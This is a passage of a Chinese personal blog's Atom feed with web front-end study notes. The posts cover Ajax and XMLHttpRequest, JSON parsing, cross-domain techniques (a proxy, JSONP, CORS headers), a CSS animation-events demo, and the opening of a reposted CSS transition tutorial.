      <category term="爱情" scheme="http://www.wanglinzhizhi.me/tags/%E7%88%B1%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>Web前端: Ajax Notes</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/Ajax%20Notes/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/Ajax Notes/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:15:23.000Z</updated>
    
    <content type="html"><![CDATA[<hr>

<h1 id="Ajax-Notes"><a href="#Ajax-Notes" class="headerlink" title="Ajax Notes"></a>Ajax Notes</h1><p>HTML和CSS 来实现页面，表达信息</p>
<p>运用XMLHttpRequest和web服务器进行数据的异步交换</p>
<p>用javascript 操作DOM,实现动态局部刷新</p>
<hr>

<h2 id="XMLHttpRequest-对象创建"><a href="#XMLHttpRequest-对象创建" class="headerlink" title="XMLHttpRequest 对象创建"></a>XMLHttpRequest 对象创建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var request=new XMLHttpRequest();</div></pre></td></tr></table></figure>
<hr>

<h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>无状态协议</p>
<p>Get请求:</p>
<ul>
<li>一般用于获取信息(一般用于查询信息)</li>
</ul>
<ul>
<li>使用URL传递参数</li>
</ul>
<ul>
<li>对所发送信息的数量也有限制,一般在2000个字符以内.</li>
</ul>
<p>Notes：GET请求是 幂等</p>
<p>POST请求(相对安全):</p>
<ul>
<li>一般用于修改服务器上 的资源</li>
</ul>
<ul>
<li>对所发送信息的数量无限制</li>
</ul>
<p>HTTP响应:</p>
<ol>
<li>数字和文字,状态码</li>
<li>响应头.和请求头一样包含许多有用的信息,服务器类型,日期时间,内容类型和长度等</li>
<li>响应体</li>
</ol>
<p>XMLHttpRequest发送请求</p>
<ul>
<li>open(method,url,async)</li>
</ul>
<ul>
<li>sent(string)</li>
</ul>
<p><strong>demo</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">request.open(&quot;POST&quot;,&quot;create.php&quot;,true);</div><div class="line">request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">request.send(&quot;name=wanglinzhizhi&amp;sex=male&quot;);</div></pre></td></tr></table></figure>
<p>Notes:request.setRequestHeader 这个必须要加,渲染方式</p>
<hr>

<h2 id="JSON的解析"><a href="#JSON的解析" class="headerlink" title="JSON的解析"></a>JSON的解析</h2><p>方法一 eval()方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var jsondata=&apos;&#123;&quot;staff&quot;:[&#123;&quot;name&quot;:&quot;洪七&quot;,&quot;age&quot;:70&#125;,&#123;&quot;name&quot;:&quot;郭靖&quot;,&quot;age&quot;:30&#125;,&#123;&quot;name&quot;:&quot;黄蓉&quot;,&quot;age&quot;:35&#125;]&#125;&apos;;</div><div class="line">var jsonobj=eval(&apos;(&apos;+jsondata+&apos;)&apos;);</div><div class="line">alert(jsonobj.staff[0].name);</div></pre></td></tr></table></figure>
<p>方法二(JSON.parse)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var jsondata=&apos;&#123;&quot;staff&quot;:[&#123;&quot;name&quot;:&quot;洪七&quot;,&quot;age&quot;:70&#125;,&#123;&quot;name&quot;:&quot;郭靖&quot;,&quot;age&quot;:30&#125;,&#123;&quot;name&quot;:&quot;黄蓉&quot;,&quot;age&quot;:35&#125;]&#125;&apos;;</div><div class="line">var jsonobj=JSON.parse(jsondata);</div><div class="line">alert(jsonobj.staff[0].name);</div></pre></td></tr></table></figure>
<p>推荐使用第二种方法</p>
<p>Note: <strong>无论何时使用eval时是非常危险的.</strong></p>
<p>JSON校验</p>
<p><a href="http://jsonlint.com/" target="_blank" rel="external">http://jsonlint.com/</a></p>
<p>Notes:CND加速的jquery库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;http://apps.bdimg.com/libs/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>// 使用了CDN加速,调用很快.</p>
<hr>

<h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><p>javascript出于安全方面的考虑，不允许跨域调用其他页面的对象。</p>
<p>什么是跨域呢？简单地理解就是因为javascript同源策略的限制，a.com域名下的js无法操作b.com或是c.a.com域名下的对象。</p>
<p>解决跨域问题的方法</p>
<ol>
<li><strong>代理</strong><br>通过在同域名下的web服务器端创建一个代理：<br>北京服务器(域名:www.beijing.com)<br>上海服务器(域名：www.shanghai.com)<br>比如在北京的web服务器的后台(www.beijing.com/proxy-shanghaiservice.php)来调用上海服务器(www.shanghai.com/services.php)的服务，然后再把访问结果返回给前端，这样前端调用北京同域名的服务就和调用上海的服务效果相同了。<br>​</li>
<li><strong>JSONP(只支持GET请求)：</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;http://www.bbb.com/jsonp.js&quot;&gt;&lt;/script&gt;</div><div class="line">在www.aaa.com页面中</div><div class="line">&lt;script&gt;</div><div class="line">function jsonp(json)&#123;</div><div class="line">alert(json[&quot;name&quot;]);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">在www.bbb.com页面中:</div><div class="line">jsonp(&#123;&quot;name&quot;:&quot;洪七公&quot;,&apos;age&apos;:24&#125;);</div><div class="line">jsonp只能对get请求起作用,不能对post请求起作用(不支持post请求)</div></pre></td></tr></table></figure>
<p>JSONP可用于解决主流浏览器的跨域数据访问的问题。<br>在www.aaa.com页面中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"> function jsonp(json)&#123;</div><div class="line">      alert(json[&quot;name&quot;]);</div><div class="line">  &#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;script src=&quot;http;//www.bbb.com/jsonp.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>在www.bbb.com页面中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">jsonp(&#123;&apos;name&apos;:&apos;xx&apos;,&apos;age&apos;:24&#125;)</div></pre></td></tr></table></figure>
<p>这样就可以实现在www.aaa.com客户端访问获取www.bbb.com所在服务器中的文件或数据,从而实现跨域</p>
<p><strong>3.XHR2</strong></p>
<p>HTML5 提供的XMLHttpRequest Level2已经实现了跨域访问以及其他一些新功能:</p>
<p>对于解决跨域问题,只需要对<strong>服务端</strong>做较小的改变, 客户端不需要做改变</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">header(&quot;Content-Type:application/json;charset=utf-8&quot;);</div><div class="line"></div><div class="line">header(&quot;Access-Control-Allow-Origin:*&quot;);</div><div class="line"></div><div class="line">header(&quot;Access-Control-Allow-Methods:POST,GET&quot;);</div></pre></td></tr></table></figure>
<p>Notes:</p>
<ol>
<li>HTML5提供的XMLHttpRequest Level2已经实现了跨域访问以及其他的一些新功能</li>
<li>IE10以下的版本都不支持</li>
<li>在服务器端</li>
</ol>
<p><strong>总结:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">跨域处理，三种方法：</div><div class="line">1、处理跨域方法一 代理</div><div class="line"></div><div class="line">2、处理跨域方式二——</div><div class="line"></div><div class="line">3、处理跨域的方法三——XHR2：</div><div class="line"></div><div class="line">header(&apos;Access-Control-Allow-Origin:*&apos;);</div><div class="line">header(&apos;Access-Control-Allow-Methods:POST,GET&apos;);</div></pre></td></tr></table></figure>
<hr>

<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>JavaScript原生版实现demo,这里只给出了ajax需要部分的代码,后端的 json已经前端的样式等内容都未写出来(因为太多了…)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"search"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  request.open(<span class="string">"GET"</span>, <span class="string">"serverjson.php?number="</span> + 	<span class="built_in">document</span>.getElementById(<span class="string">"keyword"</span>).value);</div><div class="line">  request.send();</div><div class="line"></div><div class="line">  request.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (request.readyState===<span class="number">4</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (request.status===<span class="number">200</span>) &#123;</div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(request.responseText);</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"searchResult"</span>).innerHTML = data.msg;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"searchResult"</span>).innerHTML = <span class="string">"出现错误："</span> + data.msg;</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"发生错误："</span> + request.status);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"save"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  request.open(<span class="string">"POST"</span>, <span class="string">"serverjson.php"</span>);</div><div class="line">  <span class="keyword">var</span> data = <span class="string">"name="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffName"</span>).value</div><div class="line">  + <span class="string">"&amp;number="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffNumber"</span>).value</div><div class="line">  + <span class="string">"&amp;sex="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffSex"</span>).value</div><div class="line">  + <span class="string">"&amp;job="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffJob"</span>).value;</div><div class="line">  request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">  request.send(data);</div><div class="line">  request.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (request.readyState===<span class="number">4</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (request.status===<span class="number">200</span>) &#123;</div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(request.responseText);</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"createResult"</span>).innerHTML = data.msg;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"createResult"</span>).innerHTML = <span class="string">"出现错误："</span> + data.msg;</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"发生错误："</span> + request.status);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>jQuery版的实现</p>
<p>jQuery中封装了request.setRequestHeader(“Content-type”… 故不需要额外添加句代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  $(<span class="string">"#search"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">      <span class="attr">type</span>: <span class="string">"GET"</span>, 	</div><div class="line">      <span class="attr">url</span>: <span class="string">"http://127.0.0.1:8000/ajaxdemo/serverjsonp.php?number="</span> + $(<span class="string">"#keyword"</span>).val(),</div><div class="line">      <span class="attr">dataType</span>: <span class="string">"jsonp"</span>,</div><div class="line">      <span class="attr">jsonp</span>: <span class="string">"callback"</span>,</div><div class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          $(<span class="string">"#searchResult"</span>).html(data.msg);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          $(<span class="string">"#searchResult"</span>).html(<span class="string">"出现错误："</span> + data.msg);</div><div class="line">        &#125;  </div><div class="line">      &#125;,</div><div class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">jqXHR</span>)</span>&#123;     </div><div class="line">        alert(<span class="string">"发生错误："</span> + jqXHR.status);  </div><div class="line">      &#125;,     </div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  $(<span class="string">"#save"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">      <span class="attr">type</span>: <span class="string">"POST"</span>, 	</div><div class="line">      <span class="attr">url</span>: <span class="string">"http://127.0.0.1:8000/ajaxdemo/serverjsonp.php"</span>,</div><div class="line">      <span class="attr">data</span>: &#123;</div><div class="line">        <span class="attr">name</span>: $(<span class="string">"#staffName"</span>).val(),</div><div class="line">        <span class="attr">number</span>: $(<span class="string">"#staffNumber"</span>).val(),</div><div class="line">        <span class="attr">sex</span>: $(<span class="string">"#staffSex"</span>).val(),</div><div class="line">        <span class="attr">job</span>: $(<span class="string">"#staffJob"</span>).val()</div><div class="line">      &#125;,</div><div class="line">      <span class="attr">dataType</span>: <span class="string">"json"</span>,</div><div class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          $(<span class="string">"#createResult"</span>).html(data.msg);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          $(<span class="string">"#createResult"</span>).html(<span class="string">"出现错误："</span> + data.msg);</div><div class="line">        &#125;  </div><div class="line">      &#125;,</div><div class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">jqXHR</span>)</span>&#123;     </div><div class="line">        alert(<span class="string">"发生错误："</span> + jqXHR.status);  </div><div class="line">      &#125;,     </div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;

&lt;h1 id=&quot;Ajax-Notes&quot;&gt;&lt;a href=&quot;#Ajax-Notes&quot; class=&quot;headerlink&quot; title=&quot;Ajax Notes&quot;&gt;&lt;/a&gt;Ajax Notes&lt;/h1&gt;&lt;p&gt;HTML和CSS 来实现页面，表达信息&lt;/p&gt;
&lt;p&gt;运用XML
    
    </summary>
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/tags/JavaScript/"/>
    
      <category term="Ajax" scheme="http://www.wanglinzhizhi.me/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>CSS vertical-align 属性</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS%20vertical-align%20%E5%9E%82%E7%9B%B4%E6%96%B9%E5%90%91%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9A%84%E5%B1%85%E4%B8%AD%20/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS vertical-align 垂直方向多行文本的居中 /</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:15:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS-vertical-align-属性"><a href="#CSS-vertical-align-属性" class="headerlink" title="CSS vertical-align 属性"></a>CSS vertical-align 属性</h2><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span>&#123;</div><div class="line">  </div><div class="line">true<span class="attribute">vertical-align</span>:middle	<span class="comment">/*把此元素放置在父元素的中部。*/</span></div><div class="line">  	display:table-cell;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS-vertical-align-属性&quot;&gt;&lt;a href=&quot;#CSS-vertical-align-属性&quot; class=&quot;headerlink&quot; title=&quot;CSS vertical-align 属性&quot;&gt;&lt;/a&gt;CSS vertical-align 属性&lt;/
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS3 AnimateEnd 事件</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS3%20AnimateEnd%E4%BA%8B%E4%BB%B6/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS3 AnimateEnd事件/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:16:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS3-AnimateEnd-事件"><a href="#CSS3-AnimateEnd-事件" class="headerlink" title="CSS3 AnimateEnd 事件"></a>CSS3 AnimateEnd 事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> </span></div><div class="line"><span class="selector-id">#myD</span>&#123;</div><div class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">550px</span>;</div><div class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">    <span class="attribute">background</span>: orange;</div><div class="line">    <span class="attribute">position</span>: relative;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/* Chrome, Safari, Opera */</span></div><div class="line">@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> mymove &#123;</div><div class="line">    <span class="selector-tag">from</span> &#123;<span class="attribute">top</span>: <span class="number">0px</span>;&#125;</div><div class="line">    <span class="selector-tag">to</span> &#123;<span class="attribute">top</span>: <span class="number">200px</span>;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> mymove &#123;</div><div class="line">    <span class="selector-tag">from</span> &#123;<span class="attribute">top</span>: <span class="number">0px</span>;&#125;</div><div class="line">    <span class="selector-tag">to</span> &#123;<span class="attribute">top</span>: <span class="number">200px</span>;&#125;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用addEventListener()方法给div元素添加"animationstart事件、animationiteration事件、animationend事件<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myD"</span> <span class="attr">onclick</span>=<span class="string">"myFc()"</span>&gt;</span>点击这里开始播放动画<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line">  </div><div class="line">  </div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.getElementById(<span class="string">"myD"</span>);</div><div class="line"><span class="comment">// 使用JavaScript播放动画</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFc</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    x.style.WebkitAnimation = <span class="string">"mymove 4s 2"</span>; <span class="comment">// 用于Chrome、 Safari、 Opera浏览器</span></div><div class="line">    x.style.animation = <span class="string">"mymove 4s 2"</span>;       <span class="comment">// 标准语法</span></div><div class="line">    &#125;</div><div class="line"><span class="comment">// Chrome、 Safari、 Opera</span></div><div class="line">x.addEventListener(<span class="string">"webkitAnimationStart"</span>, myStartFunction);</div><div class="line">x.addEventListener(<span class="string">"webkitAnimationIteration"</span>, myRepeatFunction);</div><div class="line">x.addEventListener(<span class="string">"webkitAnimationEnd"</span>, myEndFunction);</div><div class="line"><span class="comment">// 标准语法</span></div><div class="line">x.addEventListener(<span class="string">"animationstart"</span>, myStartFunction);</div><div class="line">x.addEventListener(<span class="string">"animationiteration"</span>, myRepeatFunction);</div><div class="line">x.addEventListener(<span class="string">"animationend"</span>, myEndFunction);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myStartFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationstart事件 - 开始播放动画"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"pink"</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myRepeatFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationiteration事件 -动画重复播放了！"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"lightblue"</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myEndFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationend event occured -动画播放完毕"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"lightgray"</span>;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS3-AnimateEnd-事件&quot;&gt;&lt;a href=&quot;#CSS3-AnimateEnd-事件&quot; class=&quot;headerlink&quot; title=&quot;CSS3 AnimateEnd 事件&quot;&gt;&lt;/a&gt;CSS3 AnimateEnd 事件&lt;/h2&gt;&lt;figure c
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/tags/JavaScript/"/>
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="移动Web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8Web/"/>
    
      <category term="动画" scheme="http://www.wanglinzhizhi.me/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>CSS动画简介</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS%E5%8A%A8%E7%94%BB%E7%AE%80%E4%BB%8B%20%E9%98%AE%E4%B8%80%E5%B3%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS动画简介 阮一峰/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS动画简介"><a href="#CSS动画简介" class="headerlink" title="CSS动画简介"></a>CSS动画简介</h2><p>作者： <a href="http://www.ruanyifeng.com/" target="_blank" rel="external">阮一峰</a></p>
<p>日期： <a href="http://www.ruanyifeng.com/blog/2014/02/" target="_blank" rel="external">2014年2月14日</a></p>
<p>现在，我很少写介绍CSS的文章，因为感觉网站开发的关键还是在服务器端。</p>
<p>但是，CSS动画除外，它实在太有用了。</p>
<p><img src="http://image.beekka.com/blog/201402/bg2014021402.png" alt="img"></p>
<p>本文介绍CSS动画的两大组成部分：transition和animation。我不打算给出每一条属性的详尽介绍，那样可以写一本书。这篇文章只是一个简介，帮助初学者了解全貌，同时又是一个快速指南，当你想不起某一个用法的时候，能够快速地找到提示。</p>
<p>我的主要参考资料是，2013年10月，<a href="http://lea.verou.me/" target="_blank" rel="external">Lea Verou</a>在JSConf.Asia上面的演讲<a href="http://2013.jsconf.asia/blog/2013/10/31/jsconfasia-2013-lea-verou-css-in-the-4th-dimension-not-your-daddys-css-animations" target="_blank" rel="external">《CSS in the 4th Dimension》</a>。那是一个非常棒的演讲，有<a href="https://www.youtube.com/watch?v=NTJUFQmHbvc" target="_blank" rel="external">视频</a>和<a href="http://lea.verou.me/css-4d/" target="_blank" rel="external">幻灯片</a>，强烈推荐。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<p><br></p>
<h2 id="第一部分：CSS-Transition"><a href="#第一部分：CSS-Transition" class="headerlink" title="第一部分：CSS Transition"></a>第一部分：CSS Transition</h2><h3 id="1-1-基本用法"><a href="#1-1-基本用法" class="headerlink" title="1.1 基本用法"></a>1.1 基本用法</h3><p><strong>在CSS 3引入Transition（过渡）这个概念之前，CSS是没有时间轴的。也就是说，所有的状态变化，都是即时完成。</strong></p>
<p>上面是一个演示，当鼠标放置于缩略图之上，缩略图会迅速变大。注意，缩略图的变大是瞬间实现的。下面是代码，相当简单。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">height</span>:<span class="number">15px</span>;</div><div class="line">    <span class="attribute">width</span>:<span class="number">15px</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span>&#123;</div><div class="line">    <span class="attribute">height</span>: <span class="number">450px</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">450px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>transition的作用在于，指定状态变化所需要的时间。</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码指定，图片放大的过程需要1秒，效果如下。</p>
<p>我们还可以指定transition适用的属性，比如只适用于height。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这样一来，只有height的变化需要1秒实现，其他变化（主要是width）依然瞬间实现，效果如下。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-2-transition-delay"><a href="#1-2-transition-delay" class="headerlink" title="1.2 transition-delay"></a>1.2 transition-delay</h3><p>在同一行transition语句中，可以分别指定多个属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height, <span class="number">1s</span> width;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是，这样一来，height和width的变化是同时进行的，跟不指定它们没有差别，效果如下。</p>
<p>我们希望，让height先发生变化，等结束以后，再让width发生变化。实现这一点很容易，就是为width指定一个delay参数。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height, <span class="number">1s</span> <span class="number">1s</span> width;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面代码指定，width在1秒之后，再开始变化，也就是延迟（delay）1秒，效果如下。</p>
<p>delay的真正意义在于，它指定了动画发生的顺序，使得多个不同的transition可以连在一起，形成复杂效果。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-3-transition-timing-function"><a href="#1-3-transition-timing-function" class="headerlink" title="1.3 transition-timing-function"></a>1.3 transition-timing-function</h3><p>transition的状态变化速度（又称timing function），默认不是匀速的，而是逐渐放慢，这叫做ease。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>除了ease以外，其他模式还包括</p>
<blockquote>
<p>（1）linear：匀速</p>
<p>（2）ease-in：加速</p>
<p>（3）ease-out：减速</p>
<p>（4）cubic-bezier函数：自定义速度模式</p>
</blockquote>
<p>最后那个cubic-bezier，可以使用<a href="http://cubic-bezier.com/" target="_blank" rel="external">工具网站</a>来定制。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> height <span class="built_in">cubic-bezier</span>(.83,.97,.05,1.44);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面的代码会产生一个最后阶段放大过度、然后回缩的效果。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<h3 id="1-4-transition的各项属性"><a href="#1-4-transition的各项属性" class="headerlink" title="1.4 transition的各项属性"></a>1.4 transition的各项属性</h3><p>transition的完整写法如下。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">img</span>&#123;</div><div class="line">    <span class="attribute">transition</span>: <span class="number">1s</span> <span class="number">1s</span> height ease;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
